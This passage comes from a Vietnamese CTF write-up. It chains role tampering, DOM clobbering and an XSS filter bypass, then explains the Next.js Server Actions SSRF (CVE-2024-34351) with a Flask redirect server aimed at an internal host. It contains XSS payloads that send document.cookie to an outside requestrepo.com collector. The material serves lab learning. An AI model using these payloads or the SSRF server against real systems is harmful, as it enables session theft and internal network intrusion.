<p>register accont -&gt; login -&gt; change Role with value <code>admın</code> -&gt; changePermission -&gt; createPost with content value dom clobbering to change value <code>window.conf</code> -&gt; redirect to <code>/admin/test/</code> to triggerXSS with paramater</p>
<h3 id="exploit-docker-local">Exploit docker local</h3>
<p>Khi khai thác với server thực tế thì có thêm cả phần check nếu dùng <code>&lt;a </code> thì sẽ chặn và phần này được comment ở trong mã nguồn</p>
<p><img src="https://hackmd.io/_uploads/r1psdWK6Jx.png" alt="image"></p>
<p>Và bypass nó bằng cách dùng <code>&lt;a/</code> để thay thế space</p>
<p><img src="https://hackmd.io/_uploads/rJSd5ZFTkg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Syk9qWtpkg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ryjaqWtTyg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Skofo-YaJg.png" alt="image"></p>
<p>payload:</p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">a</span><span class="o">/</span><span class="nx">id</span><span class="o">=</span><span class="s2">&#34;conf&#34;</span><span class="o">&gt;&lt;</span><span class="err">/a&gt;&lt;a/id=&#34;conf&#34; name=&#34;deleteUrl&#34; href=&#34;/admin/test/?title=%3Csvg%20onload=window.location=`https://avsgx93b.requestrepo.com/?a=${document.cookie}`%3E&#34;&gt;&lt;/a&gt;</span>
</code></pre></div><pre><code>&lt;meta/http-equiv=&quot;refresh&quot;/content=&quot;0; url=https://l3mnt2010.github.io/admin/test/?title=a&amp;content=%3Cimg%20src=x%20onerror=window.location=https://avsgx93b.requestrepo.com`?${{document.cookie}}`%3E&quot;&gt;
</code></pre><h2 id="hide-and-seek">Hide and seek</h2>
<h3 id="cve-2024-34351-server-side-request-forgery-in-nextjs-server-actions">CVE-2024-34351: Server-Side Request Forgery in NextJS Server Actions</h3>
<p>Trước đây mình cũng đã từng gặp bài khai thác về lỗ hổng này rồi, và lúc làm cũng có nghĩ đến nhưng mà vì bài dạng guess phần external service cho nên mình đã miss mất hướng này, giờ thì ta sẽ cùng nói rõ về lỗ hổng này.</p>
<h3 id="tối-ưu-hóa-hình-ảnh-với-_nextimage">Tối ưu hóa hình ảnh với <code>_next/image</code></h3>
<p>Nextjs có 1 điểm hay so với html thông thường hay reactjs thông thường là có thể import module ảnh và có thể thay đổi được kích động, vì nếu mà ảnh được người dùng truy cập trang và hiển thị -&gt; sau đó server nhận được yêu cầu, gửi nguyên ảnh kích thước ban đầu xuống cho client -&gt; tiếp theo thì nhờ css và html resize lại kích thước hiển thị của ảnh là một nhanh chóng hơn việc load hết:</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">Image</span>
  <span class="na">src</span><span class="o">=</span><span class="s">&#34;/lamnt2010.jpg&#34;</span>
  <span class="na">width</span><span class="o">=</span><span class="s">{256}</span>
  <span class="na">quality</span><span class="o">=</span><span class="s">{75}</span>
  <span class="na">alt</span><span class="o">=</span><span class="s">&#34;Picture of a kman&#34;</span>
<span class="p">/&gt;</span>
</code></pre></div><p>Thực tế thì khi mà sử dụng như này thì nó sẽ gọi đến api này <code>https://example.com/_next/image?url=https://l3mnt2010.github.io/lamnt2010.jpg&amp;w=256&amp;q=75</code> -&gt; quá trình sẽ diễn ra như sau:</p>
<p>Người dùng truy cập ảnh -&gt; phía server sẽ truy xuất đến localhost để xem ảnh đó có tồn tại hay không -&gt; nếu có server sẽ thay đổi kích thước hình ảnh bằng thư viện thao tác hình ảnh phía server và hiển thị kết quả cho người dùng.</p>
<ul>
<li>Trong trường hợp nếu ảnh đó nằm trên một tên miền khác, kiểu như cloud, cdn chẳng hạn thì next cũng sẽ cung cấp config đó là <code>remotePatterns</code> trong file next.config.js hoặc đuôi khác để thực hiện điều đó</li>
</ul>
<p><img src="https://hackmd.io/_uploads/rkwlCii6Jg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H1iWAojpJx.png" alt="image"></p>
<p>có thể như là:</p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"> <span class="nx">images</span><span class="o">:</span> <span class="p">{</span>
        <span class="nx">remotePatterns</span><span class="o">:</span> <span class="p">[</span>
            <span class="p">{</span>
                <span class="nx">protocol</span><span class="o">:</span> <span class="s1">&#39;https&#39;</span><span class="p">,</span>
                <span class="nx">hostname</span><span class="o">:</span> <span class="s1">&#39;cdn.example.com&#39;</span><span class="p">,</span>
            <span class="p">},</span>
            <span class="p">{</span>
                <span class="nx">protocol</span><span class="o">:</span> <span class="s1">&#39;https&#39;</span><span class="p">,</span>
                <span class="nx">hostname</span><span class="o">:</span> <span class="s1">&#39;third-party.com&#39;</span><span class="p">,</span>
            <span class="p">},</span>
        <span class="p">],</span>
    <span class="p">},</span>
</code></pre></div><ul>
<li>
<p>giờ thì người dùng có thể tải ảnh từ một tên miền khác và api được server xử lý ảnh đó chính là <code>https://example.com/_next/image?url=https://cdn.example.com/i/rabbit.png&amp;w=256&amp;q=75</code></p>
</li>
<li>
<p>nếu mà muốn tải ảnh từ bất kỳ trang web nào thì có thể đặt giá trị config như sau:</p>
</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript">  <span class="nx">images</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">remotePatterns</span><span class="o">:</span> <span class="p">[</span>
		<span class="p">{</span>
			<span class="nx">protocol</span><span class="o">:</span> <span class="s2">&#34;https&#34;</span><span class="p">,</span>
			<span class="nx">hostname</span><span class="o">:</span> <span class="s2">&#34;**&#34;</span><span class="p">,</span>
		<span class="p">},</span>
		<span class="p">{</span>
			<span class="nx">protocol</span><span class="o">:</span> <span class="s2">&#34;http&#34;</span><span class="p">,</span>
			<span class="nx">hostname</span><span class="o">:</span> <span class="s2">&#34;**&#34;</span><span class="p">,</span>
		<span class="p">},</span>
    <span class="p">],</span>
  <span class="p">},</span>
</code></pre></div><p>Vậy thì nếu điều này xảy ra thì vô tình nó là tiền đề cho SSRF attack, vì nếu ta gọi đến <code>https://example.com/_next/image?url=https://localhost:1337/flag</code></p>
<ul>
<li>từ tiền đề này ta có thể phát triển thêm cuộc tấn công với một vài config rủi ro sau đây:</li>
</ul>
<ul>
<li>
<p>nếu version nextjs quá cũ hoặc <code>dangerouslyAllowSVG</code> được bật thì ta có thể trỏ đến trang host của mình với hình ảnh <code>svg</code> và dẫn đến cuộc tấn công xss</p>
</li>
<li>
<p>Nếu ta access đến một endpoint trả ra xml thì ta hoàn toàn có thể đọc hết dữ liệu từ nó vì nextjs chỉ kiểm tra phản hồi bắt đầu bằng <code>&lt;?xml</code></p>
</li>
<li>
<p>nếu nó chỉ cho phép gọi từ một số trang web mà nếu trang web được cho phép có chức năng redirect ví dụ như logout với đường dẫn chuyển hướng tùy ý thì <code>https://example.com/_next/image?url=https://third-party.com/logout%3furl%3Dhttps%3A%2F%2Flocalhost%3A2345%2Fapi%2Fv1%2Fx&amp;w=256&amp;q=75</code> ta vẫn có thể SSRF tới một trang web trong mạng nội bộ của victim như mong muốn</p>
</li>
</ul>
<h3 id="server-action">Server action</h3>
<p>Nextjs vẫn xử lý những tác vụ bất đồng bộ ở phía server, quan sát mã nguồn xử lý của version dính SSRF</p>
<div class="highlight"><pre class="chroma"><code class="language-typescript" data-lang="typescript"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">createRedirectRenderResult</span><span class="p">(</span>
  <span class="nx">req</span>: <span class="kt">IncomingMessage</span><span class="p">,</span>
  <span class="nx">res</span>: <span class="kt">ServerResponse</span><span class="p">,</span>
  <span class="nx">redirectUrl</span>: <span class="kt">string</span><span class="p">,</span>
  <span class="nx">basePath</span>: <span class="kt">string</span><span class="p">,</span>
  <span class="nx">staticGenerationStore</span>: <span class="kt">StaticGenerationStore</span>
<span class="p">)</span> <span class="p">{</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s1">&#39;x-action-redirect&#39;</span><span class="p">,</span> <span class="nx">redirectUrl</span><span class="p">)</span>
  <span class="c1">// if we&#39;re redirecting to a relative path, we&#39;ll try to stream the response
</span><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nx">redirectUrl</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">))</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">forwardedHeaders</span> <span class="o">=</span> <span class="nx">getForwardedHeaders</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span>
    <span class="nx">forwardedHeaders</span><span class="p">.</span><span class="kr">set</span><span class="p">(</span><span class="nx">RSC_HEADER</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>

    <span class="kr">const</span> <span class="nx">host</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span>
    <span class="kr">const</span> <span class="nx">proto</span> <span class="o">=</span>
      <span class="nx">staticGenerationStore</span><span class="p">.</span><span class="nx">incrementalCache</span><span class="o">?</span><span class="p">.</span><span class="nx">requestProtocol</span> <span class="o">||</span> <span class="s1">&#39;https&#39;</span>
    <span class="kr">const</span> <span class="nx">fetchUrl</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">proto</span><span class="si">}</span><span class="sb">://</span><span class="si">${</span><span class="nx">host</span><span class="si">}${</span><span class="nx">basePath</span><span class="si">}${</span><span class="nx">redirectUrl</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
    <span class="c1">// .. snip ..
</span><span class="c1"></span>    <span class="k">try</span> <span class="p">{</span>
      <span class="kr">const</span> <span class="nx">headResponse</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">fetchUrl</span><span class="p">,</span> <span class="p">{</span>
        <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;HEAD&#39;</span><span class="p">,</span>
        <span class="nx">headers</span>: <span class="kt">forwardedHeaders</span><span class="p">,</span>
        <span class="nx">next</span><span class="o">:</span> <span class="p">{</span>
          <span class="c1">// @ts-ignore
</span><span class="c1"></span>          <span class="nx">internal</span>: <span class="kt">1</span><span class="p">,</span>
        <span class="p">},</span>
      <span class="p">})</span>

      <span class="k">if</span> <span class="p">(</span>
        <span class="nx">headResponse</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="kr">get</span><span class="p">(</span><span class="s1">&#39;content-type&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="nx">RSC_CONTENT_TYPE_HEADER</span>
      <span class="p">)</span> <span class="p">{</span>
        <span class="kr">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">fetchUrl</span><span class="p">,</span> <span class="p">{</span>
          <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;GET&#39;</span><span class="p">,</span>
          <span class="nx">headers</span>: <span class="kt">forwardedHeaders</span><span class="p">,</span>
          <span class="nx">next</span><span class="o">:</span> <span class="p">{</span>
            <span class="c1">// @ts-ignore
</span><span class="c1"></span>            <span class="nx">internal</span>: <span class="kt">1</span><span class="p">,</span>
          <span class="p">},</span>
        <span class="p">})</span>
        <span class="c1">// .. snip ..
</span><span class="c1"></span>        <span class="k">return</span> <span class="k">new</span> <span class="nx">FlightRenderResult</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">body</span><span class="o">!</span><span class="p">)</span>
      <span class="p">}</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// .. snip ..
</span><span class="c1"></span>    <span class="p">}</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="nx">RenderResult</span><span class="p">.</span><span class="nx">fromStatic</span><span class="p">(</span><span class="s1">&#39;{}&#39;</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div><p>Có thể thấy ở đây nếu kết redirect bắt đầu bằng <code>/</code> thay vì trả ra kết quả hiện tại thì nó sẽ gửi request đến host lấy từ header sau đó fetch đến nó và trả ra kết quả</p>
<pre><code>Tóm lại, để dễ bị tấn công bởi SSRF này, chúng ta cần:

- Hành động của máy chủ được xác định;

- Hành động của máy chủ chuyển hướng đến một URL bắt đầu bằng / ;

- Chúng ta có thể chỉ định tiêu đề Máy chủ tùy chỉnh khi truy cập ứng dụng.
</code></pre><div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># server.py</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">Response</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span>
<span class="kn">import</span> <span class="nn">urllib.parse</span>
<span class="kn">import</span> <span class="nn">threading</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;392cc52f7a5418299a5eb22065bd1e5967c25341&#34;</span>
<span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span>
<span class="n">lock</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">defaults</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;path&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">})</span>
<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&lt;path:path&gt;&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">catch</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;HEAD&#39;</span><span class="p">:</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
        <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;text/x-component&#39;</span>
        <span class="k">return</span> <span class="n">resp</span>
    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;http://192.168.200.120:808/login?key={key}&amp;username={urllib.parse.quote(username)}&amp;password=dummy&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">update_username</span><span class="p">(</span><span class="n">new_username</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">username</span>
    <span class="k">with</span> <span class="n">lock</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">new_username</span>
    <span class="k">return</span> <span class="n">f</span><span class="s2">&#34;Username updated to: {username}&#34;</span>

<span class="k">def</span> <span class="nf">start_server</span><span class="p">():</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">use_reloader</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">Logic</span> <span class="n">như</span> <span class="n">sau</span><span class="o">:</span>

<span class="o">-</span> <span class="n">Đầu</span> <span class="n">tiên</span><span class="o">,</span> <span class="n">máy</span> <span class="n">chủ</span> <span class="n">thực</span> <span class="n">hiện</span> <span class="n">yêu</span> <span class="n">cầu</span> <span class="n">HEAD</span> <span class="n">trước</span> <span class="n">khi</span> <span class="n">gửi</span> <span class="n">đến</span> <span class="n">URL</span><span class="o">.</span>

<span class="o">-</span> <span class="n">Nếu</span> <span class="n">kiểm</span> <span class="n">tra</span> <span class="n">trước</span> <span class="n">trả</span> <span class="n">về</span> <span class="n">tiêu</span> <span class="n">đề</span> <span class="n">Content</span><span class="o">-</span><span class="n">Type</span> <span class="n">là</span> <span class="n">RSC_CONTENT_TYPE_HEADER</span> <span class="o">,</span> <span class="n">tức</span> <span class="n">là</span> <span class="n">text</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">component</span> <span class="o">,</span> <span class="n">thì</span> <span class="n">NextJS</span> <span class="n">sẽ</span> <span class="n">thực</span> <span class="n">hiện</span> <span class="n">yêu</span> <span class="n">cầu</span> <span class="n">GET</span> <span class="n">tới</span> <span class="n">cùng</span> <span class="n">một</span> <span class="n">URL</span><span class="o">.</span>

<span class="o">-</span> <span class="n">Nội</span> <span class="n">dung</span> <span class="n">của</span> <span class="n">yêu</span> <span class="n">cầu</span> <span class="n">GET</span> <span class="n">sau</span> <span class="n">đó</span> <span class="n">được</span> <span class="n">trả</span> <span class="n">về</span> <span class="n">trong</span> <span class="n">phản</span> <span class="n">hồi</span><span class="o">.</span>

<span class="n">Tất</span> <span class="n">nhiên</span><span class="o">,</span> <span class="n">không</span> <span class="n">có</span> <span class="n">khả</span> <span class="n">năng</span> <span class="n">bất</span> <span class="n">kỳ</span> <span class="n">mục</span> <span class="n">tiêu</span> <span class="n">SSRF</span> <span class="n">nào</span> <span class="n">của</span> <span class="n">chúng</span> <span class="nf">tôi</span> <span class="o">(</span><span class="n">như</span> <span class="n">điểm</span> <span class="n">cuối</span> <span class="n">siêu</span> <span class="n">dữ</span> <span class="n">liệu</span> <span class="n">đám</span> <span class="n">mây</span><span class="o">)</span> <span class="n">sẽ</span> <span class="n">trả</span> <span class="n">về</span> <span class="n">loại</span> <span class="n">nội</span> <span class="n">dung</span> <span class="n">đó</span><span class="o">,</span> <span class="n">vậy</span> <span class="n">có</span> <span class="n">thể</span> <span class="n">làm</span> <span class="n">gì</span><span class="o">?</span> <span class="n">Chúng</span> <span class="n">tôi</span> <span class="n">có</span> <span class="n">thể</span> <span class="n">đáp</span> <span class="n">ứng</span> <span class="n">các</span> <span class="n">kiểm</span> <span class="n">tra</span> <span class="n">này</span> <span class="n">và</span> <span class="n">biến</span> <span class="n">SSRF</span> <span class="n">của</span> <span class="n">mình</span> <span class="n">thành</span> <span class="n">một</span> <span class="n">bản</span> <span class="n">đọc</span> <span class="n">đầy</span> <span class="n">đủ</span> <span class="n">như</span> <span class="n">sau</span><span class="o">:</span>

<span class="o">-</span> <span class="n">Thiết</span> <span class="n">lập</span> <span class="n">máy</span> <span class="n">chủ</span> <span class="n">tiếp</span> <span class="n">nhận</span> <span class="n">yêu</span> <span class="n">cầu</span> <span class="n">trên</span> <span class="n">bất</span> <span class="n">kỳ</span> <span class="n">đường</span> <span class="n">dẫn</span> <span class="n">nào</span><span class="o">.</span>

<span class="o">-</span> <span class="n">Trên</span> <span class="n">bất</span> <span class="n">kỳ</span> <span class="n">yêu</span> <span class="n">cầu</span> <span class="n">HEAD</span> <span class="n">nào</span><span class="o">,</span> <span class="n">trả</span> <span class="n">về</span> <span class="n">200</span> <span class="n">với</span> <span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">component</span> <span class="o">.</span>

<span class="o">-</span> <span class="n">Khi</span> <span class="n">yêu</span> <span class="n">cầu</span> <span class="n">GET</span><span class="o">,</span> <span class="n">trả</span> <span class="n">về</span> <span class="n">302</span> <span class="n">cho</span> <span class="n">mục</span> <span class="n">tiêu</span> <span class="n">SSRF</span> <span class="n">dự</span> <span class="n">định</span> <span class="n">của</span> <span class="n">chúng</span> <span class="nf">ta</span> <span class="o">(</span><span class="n">chẳng</span> <span class="n">hạn</span> <span class="n">như</span> <span class="n">metadata</span><span class="o">.</span><span class="na">internal</span> <span class="n">hoặc</span> <span class="n">tương</span> <span class="n">tự</span><span class="o">)</span>

<span class="o">-</span> <span class="n">Khi</span> <span class="n">NextJS</span> <span class="n">lấy</span> <span class="n">dữ</span> <span class="n">liệu</span> <span class="n">từ</span> <span class="n">máy</span> <span class="n">chủ</span> <span class="n">của</span> <span class="n">chúng</span> <span class="n">ta</span><span class="o">,</span> <span class="n">nó</span> <span class="n">sẽ</span> <span class="n">đáp</span> <span class="n">ứng</span> <span class="n">kiểm</span> <span class="n">tra</span> <span class="n">trước</span> <span class="n">trên</span> <span class="n">yêu</span> <span class="n">cầu</span> <span class="n">HEAD</span> <span class="n">của</span> <span class="n">chúng</span> <span class="n">ta</span><span class="o">,</span> <span class="n">nhưng</span> <span class="n">sẽ</span> <span class="n">theo</span> <span class="n">chuyển</span> <span class="n">hướng</span> <span class="n">trên</span> <span class="n">GET</span><span class="o">,</span> <span class="n">cung</span> <span class="n">cấp</span> <span class="n">cho</span> <span class="n">chúng</span> <span class="n">ta</span> <span class="n">SSRF</span> <span class="n">đọc</span> <span class="n">đầy</span> <span class="n">đủ</span><span class="o">!</span>
</code></pre></div><h3 id="phân-tích-bài-toán">Phân tích bài toán</h3>
<p>Có thể thấy <code>actions.ts</code> hoàn toàn có cấu trúc như lỗ hổng được đề ra:</p>
<div class="highlight"><pre class="chroma"><code class="language-typescript" data-lang="typescript"><span class="s1">&#39;use server&#39;</span>

<span class="kr">import</span> <span class="p">{</span> <span class="nx">redirect</span> <span class="p">}</span> <span class="kr">from</span> <span class="s2">&#34;next/navigation&#34;</span><span class="p">;</span>

<span class="kr">export</span> <span class="kr">async</span> <span class="kd">function</span> <span class="nx">redirectGame() {</span>
  <span class="k">return</span> <span class="nx">redirect</span><span class="p">(</span><span class="s2">&#34;/hide-and-seek&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>nó thực hiện một action server và redirect đến url bắt đầu bằng <code>/</code></p>
<p>Version nextjs của challenge là <code>&quot;next&quot;: &quot;14.1.0&quot;</code></p>
<p>-&gt; do đó ta hoàn toàn có thể khẳng định rằng chương trình có lỗi ssrf như trên</p>
<p>Cùng đi vào phân tích lỗ hổng:</p>
<p>Quan sát file docker-compose trước, ta có thể thấy rõ các dịch vụ đang chạy trên mạng nội bộ:</p>
<div class="highlight"><pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;3.7&#39;</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="nt">services</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">external</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">build</span><span class="p">:</span><span class="w">
</span><span class="w">      </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l">./external</span><span class="w">
</span><span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l">always</span><span class="w">
</span><span class="w">    </span><span class="nt">ports</span><span class="p">:</span><span class="w">
</span><span class="w">      </span>- <span class="s2">&#34;3000:3000&#34;</span><span class="w">
</span><span class="w">    </span><span class="nt">networks</span><span class="p">:</span><span class="w">
</span><span class="w">      </span><span class="nt">prob_network</span><span class="p">:</span><span class="w">
</span><span class="w">        </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="m">192.168.200.100</span><span class="w">
</span><span class="w">
</span><span class="w">  </span><span class="nt">internal-server</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">build</span><span class="p">:</span><span class="w">
</span><span class="w">      </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l">./internal/server</span><span class="w">
</span><span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l">always</span><span class="w">
</span><span class="w">    </span><span class="nt">depends_on</span><span class="p">:</span><span class="w">
</span><span class="w">      </span>- <span class="l">internal-db</span><span class="w">
</span><span class="w">    </span><span class="nt">networks</span><span class="p">:</span><span class="w">
</span><span class="w">      </span><span class="nt">prob_network</span><span class="p">:</span><span class="w">
</span><span class="w">        </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="m">192.168.200.120</span><span class="w">
</span><span class="w">
</span><span class="w">  </span><span class="nt">internal-db</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">build</span><span class="p">:</span><span class="w">
</span><span class="w">      </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l">./internal/db</span><span class="w">
</span><span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l">always</span><span class="w">
</span><span class="w">    </span><span class="nt">networks</span><span class="p">:</span><span class="w">
</span><span class="w">      </span><span class="nt">prob_network</span><span class="p">:</span><span class="w">
</span><span class="w">        </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="m">192.168.200.130</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="nt">networks</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">prob_network</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="l">bridge</span><span class="w">
</span><span class="w">    </span><span class="nt">ipam</span><span class="p">:</span><span class="w">
</span><span class="w">      </span><span class="nt">config</span><span class="p">:</span><span class="w">
</span><span class="w">        </span>- <span class="nt">subnet</span><span class="p">:</span><span class="w"> </span><span class="m">192.168.200.0</span><span class="l">/24</span><span class="w">
</span></code></pre></div><p>Dải mạng ta đang set đến ở đây là 192.168.200.0/24 có 3 service đang được chạy đó là:</p>
<ul>
<li>
<p>external: port 3000</p>
</li>
<li>
<p>internal-server: không công khai port</p>
</li>
<li>
<p>internal-db: không công khai (có vẻ là gợi ý cho lỗ hổng sql ta sẽ khai thác ở internal)</p>
</li>
<li>
<p>giờ ta sẽ thay đổi host và origin và 2 header như dưới để có thể trigger đến domain tôi custom res như trên, mục tiêu là thông qua nextjs server ssrf đến domain này vì ta có thể trả ra được kết quả.</p>
</li>
<li>
<p>Tại <code>/api/reset-game</code></p>
</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-typescript" data-lang="typescript"><span class="kr">import</span> <span class="p">{</span> <span class="nx">NextRequest</span><span class="p">,</span> <span class="nx">NextResponse</span> <span class="p">}</span> <span class="kr">from</span> <span class="s2">&#34;next/server&#34;</span><span class="p">;</span>

<span class="kr">const</span> <span class="nx">blockedIPs</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Set</span><span class="p">&lt;</span><span class="nt">string</span><span class="p">&gt;();</span>

<span class="kr">export</span> <span class="kr">async</span> <span class="kd">function</span> <span class="nx">POST</span><span class="p">(</span><span class="nx">req</span>: <span class="kt">NextRequest</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">)</span>
    <span class="kr">const</span> <span class="nx">body</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">req</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>

    <span class="kr">const</span> <span class="nx">ip</span> <span class="o">=</span>
        <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="kr">get</span><span class="p">(</span><span class="s2">&#34;x-forwarded-for&#34;</span><span class="p">)</span><span class="o">?</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">?</span><span class="p">.</span><span class="nx">trim</span><span class="p">()</span> <span class="o">||</span>
        <span class="s2">&#34;unknown&#34;</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">ip</span> <span class="o">===</span> <span class="s2">&#34;unknown&#34;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">NextResponse</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s2">&#34;Unable to get client IP.&#34;</span> <span class="p">},</span> <span class="p">{</span> <span class="nx">status</span>: <span class="kt">400</span> <span class="p">});</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">blockedIPs</span><span class="p">.</span><span class="nx">has</span><span class="p">(</span><span class="nx">ip</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">NextResponse</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s2">&#34;This IP cannot be used yet. Please Try again later.&#34;</span> <span class="p">},</span> <span class="p">{</span> <span class="nx">status</span>: <span class="kt">403</span> <span class="p">});</span>
    <span class="p">}</span>

    <span class="k">try</span> <span class="p">{</span>
        <span class="kr">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">body</span><span class="p">.</span><span class="nx">url</span><span class="si">}</span><span class="sb">?date=</span><span class="si">${</span><span class="nb">Date</span><span class="p">()</span><span class="si">}</span><span class="sb">&amp;message=Congratulation! you found button!`</span><span class="p">,</span> <span class="p">{</span>
            <span class="nx">method</span><span class="o">:</span> <span class="s2">&#34;GET&#34;</span><span class="p">,</span>
            <span class="nx">redirect</span><span class="o">:</span> <span class="s2">&#34;manual&#34;</span><span class="p">,</span>
        <span class="p">});</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">response</span><span class="p">.</span><span class="nx">ok</span><span class="p">)</span> <span class="p">{</span>
